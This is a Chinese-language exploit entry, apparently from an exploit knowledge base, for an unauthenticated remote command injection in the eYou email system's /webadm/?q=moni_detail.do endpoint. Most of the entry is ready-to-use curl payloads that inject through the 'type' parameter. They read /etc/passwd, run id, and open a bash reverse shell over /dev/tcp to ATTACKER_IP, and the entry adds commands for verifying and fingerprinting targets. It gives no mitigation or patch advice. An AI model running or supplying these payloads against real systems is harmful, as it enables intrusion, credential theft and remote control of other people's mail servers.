---
id: EYOU-MONI-RCE
title: 亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞
product: eyou
vendor: 亿邮
version_affected: "亿邮电子邮件系统"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["亿邮电子邮件系统", "eyoumail", "亿邮"]
---

## 漏洞描述

亿邮电子邮件系统的 `/webadm/?q=moni_detail.do&action=gragh` 接口存在命令注入漏洞。`type` 参数被拼接到系统命令中执行，攻击者可通过管道符注入任意命令。

## 影响版本

- 亿邮电子邮件系统

## 前置条件

- 无需认证
- webadm 管理接口可访问

## 利用步骤

1. 向 `/webadm/?q=moni_detail.do&action=gragh` 发送 POST 请求
2. 在 `type` 参数中通过管道符注入命令
3. 命令输出在响应中返回

## Payload

### 读取 /etc/passwd

```bash
curl -s "http://target/webadm/?q=moni_detail.do&action=gragh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "type='|cat /etc/passwd||'"
```

### 执行命令

```bash
curl -s "http://target/webadm/?q=moni_detail.do&action=gragh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "type='|id||'"
```

### 反弹 Shell

```bash
curl -s "http://target/webadm/?q=moni_detail.do&action=gragh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "type='|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1||'"
```

## 验证方法

```bash
curl -s "http://target/webadm/?q=moni_detail.do&action=gragh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "type='|cat /etc/passwd||'" | grep "root:"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "亿邮电子邮件系统\|eyoumail"
```
